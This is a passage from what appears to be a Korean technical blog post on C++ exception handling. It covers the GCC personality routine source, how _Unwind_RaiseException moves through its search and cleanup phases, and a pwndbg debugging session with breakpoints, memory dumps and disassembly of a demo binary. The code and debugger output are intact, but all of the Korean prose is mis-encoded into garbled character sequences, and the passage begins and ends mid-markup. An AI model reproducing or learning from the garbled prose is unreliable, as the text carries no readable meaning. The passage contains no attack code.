null</span></span><br><span class="line">        <span class="comment">// action table offset, then there are only cleanups present.</span></span><br><span class="line">        <span class="comment">// Cleanups use a zero switch value, as set above.</span></span><br><span class="line">        found_type = found_cleanup;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Otherwise we have a catch handler or exception specification.</span></span><br><span class="line"></span><br><span class="line">        <span class="type">_sleb128_t</span> ar_filter, ar_disp;</span><br><span class="line">        <span class="type">const</span> std::type_info *catch_type;</span><br><span class="line">        _throw_typet *throw_type;</span><br><span class="line">        <span class="type">bool</span> saw_cleanup = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> saw_handler = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        thrown_ptr = __get_object_from_ue(ue_header);</span><br><span class="line">        throw_type = __get_exception_header_from_obj(thrown_ptr)-&gt;exceptionType;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            p = action_record;</span><br><span class="line">            p = <span class="built_in">read_sleb128</span>(p, &amp;ar_filter);</span><br><span class="line">            <span class="built_in">read_sleb128</span>(p, &amp;ar_disp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ar_filter == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Zero filter values are cleanups.</span></span><br><span class="line">                saw_cleanup = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ar_filter &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Positive filter values are handlers.</span></span><br><span class="line">                catch_type = <span class="built_in">get_ttype_entry</span>(&amp;info, ar_filter);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Null catch type is a catch-all handler; we can catch foreign</span></span><br><span class="line">                <span class="comment">// exceptions with this.  Otherwise we must match types.</span></span><br><span class="line">                <span class="keyword">if</span> (!catch_type || (throw_type &amp;&amp; <span class="built_in">get_adjusted_ptr</span>(catch_type, throw_type,</span><br><span class="line">                                                                   &amp;thrown_ptr))) &#123;</span><br><span class="line">                    saw_handler = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Negative filter values are exception specifications.</span></span><br><span class="line">                <span class="comment">// ??? How do foreign exceptions fit in?  As far as I can</span></span><br><span class="line">                <span class="comment">// see we can&#x27;t match because there&#x27;s no __cxa_exception</span></span><br><span class="line">                <span class="comment">// object to stuff bits in for __cxa_call_unexpected to use.</span></span><br><span class="line">                <span class="comment">// Allow them iff the exception spec is non-empty.  I.e.</span></span><br><span class="line">                <span class="comment">// a throw() specification results in __unexpected.</span></span><br><span class="line">                <span class="keyword">if</span> ((throw_type &amp;&amp; !(actions &amp; _UA_FORCE_UNWIND) &amp;&amp; !foreign_exception)</span><br><span class="line">                        ? !<span class="built_in">check_exception_spec</span>(&amp;info, throw_type, thrown_ptr,</span><br><span class="line">                                                ar_filter)</span><br><span class="line">                        : <span class="built_in">empty_exception_spec</span>(&amp;info, ar_filter)) &#123;</span><br><span class="line">                    saw_handler = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ar_disp == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            action_record = p + ar_disp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (saw_handler) &#123;</span><br><span class="line">            handler_switch_value = ar_filter;</span><br><span class="line">            found_type = found_handler;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            found_type = (saw_cleanup ? found_cleanup : found_nothing);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">do_something:</span><br><span class="line">    <span class="keyword">if</span> (found_type == found_nothing)</span><br><span class="line">        CONTINUE_UNWINDING;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (actions &amp; _UA_SEARCH_PHASE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (found_type == found_cleanup)</span><br><span class="line">            CONTINUE_UNWINDING;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For domestic exceptions, we cache data from phase 1 for phase 2.</span></span><br><span class="line">        <span class="keyword">if</span> (!foreign_exception) &#123;</span><br><span class="line">            <span class="built_in">save_caught_exception</span>(ue_header, context, thrown_ptr,</span><br><span class="line">                                  handler_switch_value, language_specific_data,</span><br><span class="line">                                  landing_pad, action_record);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _URC_HANDLER_FOUND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">install_context:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (found_type == found_terminate)</span><br><span class="line">            __cxa_call_terminate(ue_header);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cache the TType base value for __cxa_call_unexpected, as we won&#x27;t</span></span><br><span class="line">        <span class="comment">// have an _Unwind_Context then.</span></span><br><span class="line">        <span class="keyword">if</span> (handler_switch_value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">parse_lsda_header</span>(context, language_specific_data, &amp;info);</span><br><span class="line">            info.ttype_base = <span class="built_in">base_of_encoded_value</span>(info.ttype_encoding,</span><br><span class="line">                                                    context);</span><br><span class="line">            xh-&gt;catchTemp = <span class="built_in">base_of_encoded_value</span>(info.ttype_encoding, context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* For targets with pointers smaller than the word size, we must extend the</span></span><br><span class="line"><span class="comment">       pointer, and this extension is target dependent.  */</span></span><br><span class="line">    _Unwind_SetGR(context, __builtin_eh_return_data_regno(<span class="number">0</span>),</span><br><span class="line">                  __builtin_extend_pointer(ue_header));</span><br><span class="line">    _Unwind_SetGR(context, __builtin_eh_return_data_regno(<span class="number">1</span>),</span><br><span class="line">                  handler_switch_value);</span><br><span class="line">    _Unwind_SetIP(context, landing_pad);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _URC_INSTALL_CONTEXT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Personality ë£¨í‹´ì˜ ë°˜í™˜ê°’ì€ unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ì˜ ë™ì‘ê³¼ í° ì—°ê´€ì´ ìˆìŠµë‹ˆë‹¤. <code>_Unwind_RaiseException</code> í•¨ìˆ˜ëŠ” search ë‹¨ê³„ì—ì„œ personality ë£¨í‹´ì´ <code>_URC_HANDLER_FOUND</code> ë¥¼ ë°˜í™˜í•  ë•Œê¹Œì§€ ìŠ¤íƒì„ ë˜ê°ìœ¼ë©´ì„œ <code>_Unwind_Context</code> êµ¬ì¡°ì²´ì˜ ë‚´ìš©ì„ ê°±ì‹ í•©ë‹ˆë‹¤. <code>_URC_HANDLER_FOUND</code> ì˜ ë°˜í™˜ì€ ì˜ˆì™¸ë¥¼ ì²˜ë¦¬í•  catch ë¸”ë¡ì„ ë°œê²¬í–ˆë‹¤ëŠ” ì‹ í˜¸ì´ì search ë‹¨ê³„ì˜ ì„±ê³µì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ì–´ì§€ëŠ” cleanup ë‹¨ê³„ì—ì„œëŠ” <code>_URC_INSTALL_CONTEXT</code> ì˜ ë°˜í™˜ì„ ì‹ í˜¸ë¡œ í•˜ì—¬ ëœë”© íŒ¨ë“œë¡œ ì‹¤í–‰ íë¦„ì„ ì˜®ê¹ë‹ˆë‹¤. ëœë”© íŒ¨ë“œê°€ catch ë¸”ë¡ì´ë©´ ì˜ˆì™¸ ì²˜ë¦¬ê°€ ëë‚˜ë©°, cleanup ì½”ë“œë©´ <code>_Unwind_Resume</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ë‹¤ìŒ ëœë”© íŒ¨ë“œë¡œ ì§„í–‰í•˜ëŠ” ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤.</p><p>ì˜ˆì™¸ê°€ ë°œìƒí–ˆì„ ë•Œ C++ ABIì™€ unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê±°ì³ ì²˜ë¦¬í•˜ëŠ” ì „ì²´ ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ë³´ë¼ìƒ‰ ë¸”ë¡ì€ í”„ë¡œê·¸ë¨ ì½”ë“œì˜ ì¼ë¶€ë¡œ ì˜ˆì™¸ê°€ ë°œìƒí•˜ëŠ” ë¶€ë¶„ê³¼ ëœë”© íŒ¨ë“œ, ê²€ì€ìƒ‰ ë¸”ë¡ì€ C++ ABI, íšŒìƒ‰ ë¸”ë¡ì€ unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/9.png" alt="9.png"></p><h2 id="%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D" tabindex="-1">ë¼ì´ë¸ŒëŸ¬ë¦¬ ë™ì  ë¶„ì„</h2><p><code>eh1</code> ë°”ì´ë„ˆë¦¬ë¥¼ ë™ì  ë¶„ì„í•˜ë©´ì„œ ì˜ˆì™¸ ì²˜ë¦¬ì˜ í•µì‹¬ ë¶€ë¶„ì¸ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ ë° personality ë£¨í‹´ì˜ ë™ì‘ì„ ì§ì ‘ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. <code>_Unwind_RaiseException</code> í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ 5ê°œ ìœ„ì¹˜ì— ì¤‘ë‹¨ì ì„ ì„¤ì •í•©ë‹ˆë‹¤.</p><ol><li>search ë‹¨ê³„ ë°˜ë³µë¬¸ ë‚´ì—ì„œ <code>uw_frame_state_for</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00007f251026f080</span> &lt;+<span class="number">304</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rsi</span>,<span class="built_in">r13</span></span><br><span class="line">   <span class="number">0x00007f251026f083</span> &lt;+<span class="number">307</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdi</span>,<span class="built_in">r12</span></span><br><span class="line">=&gt; <span class="number">0x00007f251026f086</span> &lt;+<span class="number">310</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7f251026d800</span></span><br><span class="line">   <span class="number">0x00007f251026f08b</span> &lt;+<span class="number">315</span>&gt;:   <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x00007f251026f08e</span> &lt;+<span class="number">318</span>&gt;:   <span class="keyword">je</span>     <span class="number">0x7f251026f103</span> &lt;_Unwind_RaiseException+<span class="number">435</span>&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>search ë‹¨ê³„ ë°˜ë³µë¬¸ ë‚´ì—ì„œ <code>fs.personality</code> í•„ë“œê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë¶€ë¶„</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d81092</span> &lt;+<span class="number">322</span>&gt;:   <span class="keyword">jne</span>    <span class="number">0x7f4fc4d81160</span> &lt;_Unwind_RaiseException+<span class="number">528</span>&gt;</span><br><span class="line">   <span class="number">0x00007f4fc4d81098</span> &lt;+<span class="number">328</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x70</span>]</span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d8109c</span> &lt;+<span class="number">332</span>&gt;:   <span class="keyword">test</span>   <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x00007f4fc4d8109f</span> &lt;+<span class="number">335</span>&gt;:   <span class="keyword">je</span>     <span class="number">0x7f4fc4d810c8</span> &lt;_Unwind_RaiseException+<span class="number">376</span>&gt;</span><br><span class="line">   <span class="number">0x00007f4fc4d810a1</span> &lt;+<span class="number">337</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">r14</span>]</span><br></pre></td></tr></table></figure><ol start="3"><li>search ë‹¨ê³„ ë°˜ë³µë¬¸ ë‚´ì—ì„œ personality ë£¨í‹´ì„ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d810aa</span> &lt;+<span class="number">346</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00007f4fc4d810af</span> &lt;+<span class="number">351</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="number">0x1</span></span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d810b4</span> &lt;+<span class="number">356</span>&gt;:   <span class="keyword">call</span>   <span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x00007f4fc4d810b6</span> &lt;+<span class="number">358</span>&gt;:   <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x00007f4fc4d810b9</span> &lt;+<span class="number">361</span>&gt;:   <span class="keyword">je</span>     <span class="number">0x7f4fc4d81170</span> &lt;_Unwind_RaiseException+<span class="number">544</span>&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li><code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d8126e</span> &lt;+<span class="number">798</span>&gt;:   <span class="keyword">movups</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1e0</span>],<span class="built_in">xmm0</span></span><br><span class="line">   <span class="number">0x00007f4fc4d81275</span> &lt;+<span class="number">805</span>&gt;:   <span class="keyword">movups</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1d0</span>],<span class="built_in">xmm1</span></span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d8127c</span> &lt;+<span class="number">812</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7f4fc4d80b50</span></span><br><span class="line">   <span class="number">0x00007f4fc4d81281</span> &lt;+<span class="number">817</span>&gt;:   <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x7</span></span><br><span class="line">   <span class="number">0x00007f4fc4d81284</span> &lt;+<span class="number">820</span>&gt;:   <span class="keyword">jne</span>    <span class="number">0x7f4fc4d81103</span> &lt;_Unwind_RaiseException+<span class="number">435</span>&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li><code>uw_install_context</code> ë§¤í¬ë¡œ ë‚´ì—ì„œ ëœë”© íŒ¨ë“œë¡œ ì í”„í•˜ëŠ” ë¶€ë¶„</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d812d5</span> &lt;+<span class="number">901</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rsp</span>,<span class="built_in">rcx</span></span><br><span class="line">   <span class="number">0x00007f4fc4d812d8</span> &lt;+<span class="number">904</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rcx</span></span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d812d9</span> &lt;+<span class="number">905</span>&gt;:   <span class="keyword">jmp</span>    <span class="built_in">rcx</span></span><br></pre></td></tr></table></figure><p>í¸ì˜ë¥¼ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ <code>.gdbinit</code> íŒŒì¼ì„ ì‘ì„±í•˜ê² ìŠµë‹ˆë‹¤. ì´í›„ <code>gdb</code> ë¥¼ ì‹¤í–‰í•˜ë©´ ì¦‰ì‹œ ì¤‘ë‹¨ì ìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file eh1</span><br><span class="line">start</span><br><span class="line"></span><br><span class="line">break *(_Unwind_RaiseException+310)</span><br><span class="line">break *(_Unwind_RaiseException+332)</span><br><span class="line">break *(_Unwind_RaiseException+356)</span><br><span class="line">break *(_Unwind_RaiseException+812)</span><br><span class="line">break *(_Unwind_RaiseException+905)</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p><code>gdb</code> ë¥¼ ì‹¤í–‰í•˜ë©´ <code>uw_frame_state_for</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” 1ë²ˆì§¸ ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶¥ë‹ˆë‹¤. <code>context-&gt;ra</code> í•„ë“œë¥¼ í™•ì¸í•˜ë©´ <code>__cxa_throw</code> í•¨ìˆ˜ì—ì„œ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì§í›„ì˜ ì£¼ì†Œì…ë‹ˆë‹¤. í˜„ì¬ <code>context</code> êµ¬ì¡°ì²´ëŠ” <code>_Unwind_RaiseException</code> í•¨ìˆ˜ì˜ í”„ë ˆì„ì„ ë‚˜íƒ€ë‚´ê³  ìˆëŠ” ê²ƒì…ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x7f845bf3b086 &lt;_Unwind_RaiseException+310&gt;    call   0x7f845bf39800                &lt;0x7f845bf39800&gt;</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b08b &lt;_Unwind_RaiseException+315&gt;    cmp    eax, 5</span><br><span class="line">   0x7f845bf3b08e &lt;_Unwind_RaiseException+318&gt;    je     _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e20  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e00  0x00007ffc2f4d0e08</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e28  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e30  0x00007f845bfef69c</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x7f845bfef69c &lt;__cxa_throw+60&gt;: mov    rdi,rbp</span><br><span class="line">   0x7f845bfef69f &lt;__cxa_throw+63&gt;: call   0x7f845bfdf690 &lt;__cxa_begin_catch@plt&gt;</span><br><span class="line">   0x7f845bfef6a4 &lt;__cxa_throw+68&gt;: call   0x7f845bfdf180 &lt;std::terminate()@plt&gt;</span><br><span class="line">   0x7f845bfef6a9:  nop    DWORD PTR [rax+0x0]</span><br></pre></td></tr></table></figure><p><code>continue</code> ì»¤ë§¨ë“œë¡œ ê³„ì† ì‹¤í–‰í•˜ë©´ personality ë£¨í‹´ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ ë‹¤ì‹œ 1ë²ˆì§¸ ì¤‘ë‹¨ì ìœ¼ë¡œ ëŒì•„ì˜µë‹ˆë‹¤. ì´ë²ˆì—ëŠ” <code>context-&gt;ra</code> í•„ë“œê°€ <code>func2</code> í•¨ìˆ˜ì—ì„œ <code>__cxa_throw</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì§í›„ì˜ ì£¼ì†Œì…ë‹ˆë‹¤. ë°˜ë³µë¬¸ì—ì„œ ìŠ¤íƒì„ ë˜ê°ìœ¼ë©´ì„œ <code>context</code> êµ¬ì¡°ì²´ê°€ <code>__cxa_throw</code> í•¨ìˆ˜ì˜ í”„ë ˆì„ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e30  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e48  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e50  0x0000000000401265</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x401265 &lt;func2(int)+79&gt;:    nop</span><br><span class="line">   0x401266 &lt;func2(int)+80&gt;:    leave</span><br><span class="line">   0x401267 &lt;func2(int)+81&gt;:    ret</span><br><span class="line">   0x401268 &lt;func()&gt;:   endbr64</span><br></pre></td></tr></table></figure><p>ì´ë²ˆì—ë„ personality ë£¨í‹´ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ 1ë²ˆì§¸ ì¤‘ë‹¨ì ìœ¼ë¡œ ëŒì•„ì˜µë‹ˆë‹¤. <code>context</code> êµ¬ì¡°ì²´ëŠ” ì´ì œ <code>func2</code> í•¨ìˆ˜ì˜ í”„ë ˆì„ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x4012a6 &lt;func()+62&gt;:    lea    rax,[rbp-0x19]</span><br><span class="line">   0x4012aa &lt;func()+66&gt;:    mov    rdi,rax</span><br><span class="line">   0x4012ad &lt;func()+69&gt;:    call   0x401382 &lt;MyClass::~MyClass()&gt;</span><br><span class="line">   0x4012b2 &lt;func()+74&gt;:    nop</span><br></pre></td></tr></table></figure><p><code>func2</code> í•¨ìˆ˜ì˜ í”„ë ˆì„ì—ì„œ ìŠ¤íƒì„ ë˜ê°ìœ¼ë©´ <code>func</code> í•¨ìˆ˜ ë‚´ì˜ <code>MyClass</code> ê°ì²´ë¥¼ ì†Œë©¸í•˜ëŠ” ëœë”© íŒ¨ë“œë¡œ ì´ë™í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ personality ë£¨í‹´ì˜ ì£¼ì†Œê°€ <code>fs-&gt;personality</code> í•„ë“œì— ëŒ€ì…ë˜ì–´ ê³„ì† ì‹¤í–‰í•˜ë©´ 3ë²ˆì§¸ ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶”ê²Œ ë©ë‹ˆë‹¤. ë‹¤ë§Œ personality ë£¨í‹´ì˜ í˜¸ì¶œ ì´í›„ì—ë„ <code>context-&gt;ra</code> í•„ë“œê°€ ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¡œ ë°”ë€Œì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤. ì´ëŠ” ì§€ê¸ˆì´ search ë‹¨ê³„ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì‹¤ì œ ëœë”© íŒ¨ë“œ ì£¼ì†Œë¥¼ ëŒ€ì…í•˜ì—¬ ì‹¤í–‰ íë¦„ì„ ì˜®ê¸°ëŠ” ì‘ì—…ì€ cleanup ë‹¨ê³„ì—ì„œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 4, 0x00007f845bf3b0b4 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x7f845bf3b0b4 &lt;_Unwind_RaiseException+356&gt;    call   rax                           &lt;__gxx_personality_v0&gt;</span><br><span class="line">        rdi: 